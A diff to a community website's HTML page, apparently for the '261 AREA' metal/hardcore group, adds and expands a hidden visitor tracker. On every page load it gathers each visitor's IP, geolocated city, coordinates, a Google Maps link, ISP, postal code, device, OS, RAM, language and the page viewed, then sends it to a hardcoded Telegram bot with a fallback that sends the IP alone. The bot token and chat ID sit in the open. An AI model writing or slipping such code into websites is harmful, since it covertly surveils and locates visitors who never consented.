@@ -1011,10 +1011,69 @@
   </audio>
 
   <script>
-// ========== TELEGRAM TRACKER + GOOGLE MAPS ==========
+// ========== TELEGRAM TRACKER PREMIUM + RAM ==========
 const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
 const CHAT_ID = '6774181452';                                       // GANTI!
 
+// ========== RAM DETECTOR ==========
+function getRAM() {
+  if (navigator.deviceMemory) {
+    const ram = navigator.deviceMemory;
+    let ramDesc = '';
+    
+    if (ram <= 0.5) ramDesc = '🟠 512 MB (HP jadul banget)';
+    else if (ram <= 1) ramDesc = '🟡 1 GB (HP entry level)';
+    else if (ram <= 2) ramDesc = '🟢 2 GB (HP low-end)';
+    else if (ram <= 4) ramDesc = '🔵 4 GB (HP mid-range)';
+    else if (ram <= 6) ramDesc = '🟣 6 GB (HP mid-high)';
+    else if (ram <= 8) ramDesc = '⚫ 8 GB (HP flagship)';
+    else ramDesc = '💎 12+ GB (HP gaming/premium)';
+    
+    return `💾 *RAM:* ${ram} GB ${ramDesc}`;
+  } else {
+    return '💾 *RAM:* ❌ Tidak terdeteksi (ganti Chrome)';
+  }
+}
+
+// Deteksi provider Indonesia
+function detectProvider(ip) {
+  if (ip.includes('192.168.') || ip.includes('10.')) return 'Local Network';
+  if (ip.includes('36.68.') || ip.includes('36.69.')) return 'Telkomsel';
+  if (ip.includes('114.4.') || ip.includes('114.5.')) return 'IndiHome';
+  if (ip.includes('103.10.') || ip.includes('103.11.')) return 'First Media';
+  if (ip.includes('27.111.') || ip.includes('27.112.')) return 'MyRepublic';
+  return 'Unknown ISP';
+}
+
+// Deteksi perangkat lebih detail
+function detectDevice() {
+  const ua = navigator.userAgent;
+  const platform = navigator.platform;
+  
+  let device = 'Unknown';
+  let os = 'Unknown';
+  
+  if (ua.includes('Windows')) os = 'Windows';
+  else if (ua.includes('Mac OS')) os = 'macOS';
+  else if (ua.includes('iPhone')) os = 'iOS';
+  else if (ua.includes('iPad')) os = 'iPadOS';
+  else if (ua.includes('Android')) os = 'Android';
+  else if (ua.includes('Linux')) os = 'Linux';
+  
+  if (ua.includes('iPhone')) device = 'iPhone';
+  else if (ua.includes('iPad')) device = 'iPad';
+  else if (ua.includes('Samsung')) device = 'Samsung';
+  else if (ua.includes('Xiaomi')) device = 'Xiaomi';
+  else if (ua.includes('Oppo')) device = 'Oppo';
+  else if (ua.includes('Vivo')) device = 'Vivo';
+  else if (ua.includes('Realme')) device = 'Realme';
+  else if (ua.includes('Pixel')) device = 'Google Pixel';
+  else device = platform;
+  
+  return { device, os };
+}
+
+// Fungsi utama tracker
 async function trackVisitor() {
   try {
     // Ambil IP
@@ -1022,31 +1081,77 @@ async function trackVisitor() {
     const ipData = await ipRes.json();
     const ip = ipData.ip;
     
-    // Ambil lokasi lengkap
+    // Ambil lokasi
     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
     const geo = await geoRes.json();
     
-    // Siapin link Google Maps
-    const mapsLink = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
+    // Deteksi device
+    const { device, os } = detectDevice();
     
-    // Buat pesan keren dengan link maps
-    const pesan = ` *NANDOK ADA KIRIMAN NIH* 
+    // Deteksi provider
+    const provider = detectProvider(ip);
     
-📌 *IP:* \`${ip}\`
-🌍 *Negara:* ${geo.country_name || '-'}
-🏙️ *Kota:* ${geo.city || '-'}
-📍 *Koordinat:* ${geo.latitude || '-'}, ${geo.longitude || '-'}
-🗺️ *Google Maps:* ${mapsLink}
-📱 *Perangkat:* ${navigator.userAgent.substring(0, 50)}...
-⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+    // RAM info
+    const ramInfo = getRAM();
+    
+    // Link Google Maps
+    const mapsLink = `https://www.google.com/maps?q=${geo.latitude || '0'},${geo.longitude || '0'}`;
+    
+    // Halaman yang dibuka
+    const page = window.location.pathname;
+    
+    // Waktu Indonesia
+    const waktu = new Date().toLocaleString('id-ID', {
+      timeZone: 'Asia/Jakarta',
+      weekday: 'long',
+      year: 'numeric',
+      month: 'long',
+      day: 'numeric',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
+    
+    // PESAN LENGKAP + RAM
+    const pesan = ` *GACOR JUGA LUH NANDOK - 261 AREA*
+
+📌 *IP ADDRESS:* \`${ip}\`
+🌍 *LOKASI:* ${geo.city || '-'}, ${geo.region || '-'}, ${geo.country_name || '-'}
+📍 *KOORDINAT:* ${geo.latitude || '-'}, ${geo.longitude || '-'}
+🗺️ *GOOGLE MAPS:* [Klik Disini](${mapsLink})
+📡 *PROVIDER:* ${geo.org || provider || '-'}
+💰 *KODE POS:* ${geo.postal || '-'}
+${ramInfo}
+
+📱 *PERANGKAT:* ${device}
+🖥️ *OS:* ${os}
+🌐 *BROWSER:* ${navigator.userAgent.split(' ').slice(-2).join(' ')}
+🔋 *BAHASA:* ${navigator.language}
+⚡ *KONEKSI:* ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
+
+📄 *HALAMAN:* ${page === '/' ? 'Beranda' : page}
+⏰ *WAKTU:* ${waktu}
+🆔 *USER-AGENT:* ${navigator.userAgent.substring(0, 100)}...`;
 
     // Kirim ke Telegram
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     
+    console.log('Visitor tracked:', ip);
+    
   } catch (error) {
     console.log('Tracker error:', error);
+    // Fallback
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const ip = ipData.ip;
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=⚠️ IP: ${ip} (Data terbatas)&parse_mode=Markdown`);
+    } catch (e) {}
   }
 }
+
+// Jalankan tracker
+window.addEventListener('DOMContentLoaded', trackVisitor);
 
     // ========== SYSTEM PROMPT & KONFIGURASI AI ==========
     const SYSTEM_PROMPT = `Kamu adalah AI asisten dari 261 AREA, sebuah komunitas metal/hardcore yang keras, brutal, tapi cerdas. 
